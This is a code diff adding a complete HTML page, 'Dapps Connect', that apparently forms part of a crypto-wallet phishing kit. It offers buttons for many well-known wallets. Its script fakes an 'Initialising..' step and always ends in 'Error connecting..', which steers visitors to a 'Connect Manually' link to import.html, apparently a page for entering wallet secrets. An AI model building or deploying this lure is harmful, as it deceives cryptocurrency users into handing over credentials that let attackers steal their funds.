@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="shortcut icon" type="image/x-icon" href="./img/favicon.png">
+    <link href="./styles/sass/index.css" rel="stylesheet">
+    <title>Dapps Connect</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./wallet_files/style.css">
+    <link rel="stylesheet" href="./wallet_files/animate.min.css">
+    <link href="./wallet_files/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <link href="./wallet_files/css2-2.css" rel="stylesheet">
+    <link rel="stylesheet" href="./wallet_files/style.css">
+    <link rel="stylesheet" href="./wallet_files/animate.min.css">
+</head>
+
+<body style="background-color: #1937a5; font-family: &#39;Poppins&#39;, sans-serif;">
+    <br>
+    <header>
+        <div align="center" style="color: antiquewhite; font-size: 18px; "><b>Connect your wallet</b></div>
+    </header>
+    <main class="main-body">
+        <div class="container">
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#trust">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">TrustWallet</p>
+                <img class="wallet__image" src="./wallet_files/icn-trust-wallet.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#meta">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Metamask</p>
+                <img class="wallet__image" src="./wallet_files/icn-meta-mask.svg" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#stepn">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">STEPN Wallet</p>
+                <img class="wallet__image" src="./wallet_files/stepn wallet_200x200.jpg" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#coinbase">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Coinbase</p>
+                <img class="wallet__image" src="./wallet_files/icn-coinbase.svg" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#ledger">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Ledger</p>
+                <img class="wallet__image" src="./wallet_files/icn-ledger.svg" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#trezor">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Trezor</p>
+                <img class="wallet__image" src="./wallet_files/icn-trezor.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#formatic">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Formatic</p>
+                <img class="wallet__image" src="./wallet_files/icn-formatic.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#portis">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Portis</p>
+                <img class="wallet__image" src="./wallet_files/icn-portis.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#tokenpocket">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Token Pocket</p>
+                <img class="wallet__image" src="./wallet_files/icn-token-pocket.jpg" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#cryptocom">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Crypto.com</p>
+                <img class="wallet__image" src="./wallet_files/crypto-4cbeac57421fb3ca2573db2cf448169a.png"
+                    alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#coinmoni">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Coimoni Wallet</p>
+                <img class="wallet__image" src="./wallet_files/icn-coinmoni-wallet.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#aave">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">AAVE Wallet</p>
+                <img class="wallet__image" src="./wallet_files/icn-aave-wallet.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#monero">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Monero Wallet</p>
+                <img class="wallet__image" src="./wallet_files/icn-monero-wallet.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#binance">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Binance Smart Wallet</p>
+                <img class="wallet__image" src="./wallet_files/icn-binance-smart-chain.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#blockchain">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Blockchain</p>
+                <img class="wallet__image" src="./wallet_files/blockchain-logo.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#bitpay">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Bitpay</p>
+                <img class="wallet__image" src="./wallet_files/bitpay-1573dd6c95eb38386f181048663590d0.jpg"
+                    alt="wallet_img">
+            </a>
+
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#digitex">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Digitex</p>
+                <img class="wallet__image" src="./wallet_files/icn-digitx-wallet.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#atomic">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Atomic Wallet</p>
+                <img class="wallet__image" src="./wallet_files/icn-atomic-wallet.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#enjin">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Enjin Wallet</p>
+                <img class="wallet__image" src="./wallet_files/icn-enjin-wallet.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#eidoo">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Eidoo Wallet</p>
+                <img class="wallet__image" src="./wallet_files/icn-eidoo-wallet.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#protocol">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Protocol</p>
+                <img class="wallet__image" src="./wallet_files/icn-protocol.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#squarelink">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Squarelink</p>
+                <img class="wallet__image" src="./wallet_files/icn-squarelink.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#torus">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Torus</p>
+                <img class="wallet__image" src="./wallet_files/icn-torus.jpg" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#ronin">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Ronin</p>
+                <img class="wallet__image" src="./wallet_files/ronin.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#solana">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Solana</p>
+                <img class="wallet__image" src="./wallet_files/solana.png" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#phantom">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Phantom</p>
+                <img class="wallet__image" src="./wallet_files/phantom.webp" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#auth">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Authereum</p>
+                <img class="wallet__image" src="./wallet_files/icn-authereum.svg" alt="wallet_img">
+            </a>
+            <a class="btn wallet" data-bs-toggle="modal" data-bs-target="#others">
+                <p class="wallet_name mt-3 " style="font-size: 13px;">Others</p>
+                <img class="wallet__image" src="./wallet_files/undraw_Confirmation_re_b6q5.png" alt="wallet_img">
+            </a>
+            <br>
+            <br>
+        </div>
+        <div class="modal fade" id="trust" tabindex="-1" role="dialog" aria-labelledby="modelTitleId"
+            aria-hidden="true">
+            <div class="modal-dialog modal-dialog-centered" role="document">
+                <div class="modal-content">
+                    <div class="card" style="padding: 2px;">
+                        <div class="card-title mt-2 ml-2 h6" id='walletType' style="margin-left: 20px;">
+                            <img class="wallet__image" src="./wallet_files/icn-trust-wallet.png" alt="wallet_img">
+                            Trustwallet
+                        </div>
+                    </div>
+                    <div class="modal-header">
+                        <h5 class="modal-title" style="font-size: 14px;">
+                            <span id="myElem" style="display: none;">Connecting..</span>
+
+
+                            <span id="Elem" style="">
+                                <b class="">Initialising..</b>
+                            </span>
+                            <div class=" spinner-border text-danger" role="status">
+                                <span class="visually-hidden">Loading...</span>
+                            </div>
+                        </h5>
+                        <a href="./import.html"
+                            class="btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s"
+                            style="font-size:13px">Connect Manually</a>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </main>
+    <script async defer>
+        let cursors = document.querySelectorAll('.wallet')
+        let cancel = document.querySelector('#trust')
+        let modal = document.querySelector('#trust');
+        let heading = document.querySelector('#card-title');
+        let buttonContent = document.querySelectorAll('.wallet').innerHTML
+        let fontBold = document.querySelectorAll('.font-bold')
+        const showModal = (event) => {
+            trust.classList.add('show')
+            let headingContent = event.target.innerHTML;
+            walletType.innerHTML = headingContent;
+            walletType.style.display = 'flex'
+            walletType.style.flexDirection = 'row-reverse'
+            walletType.style.justifyContent = 'flex-end'
+            walletType.style.alignItems = 'center'
+            setTimeout(() => {
+                redirect();
+            }, 5000);
+            const redirect = () => {
+                Elem.innerHTML = ` <b class="text-danger">Error connecting..</b>`
+            };
+        }
+        const hideModal = (event) => {
+            trust.classList.remove('show')
+        }
+        cancel.addEventListener('click', hideModal)
+        cursors.forEach(cursor => cursor.addEventListener('click', showModal))
+    </script>
+</body>
+
+</html>
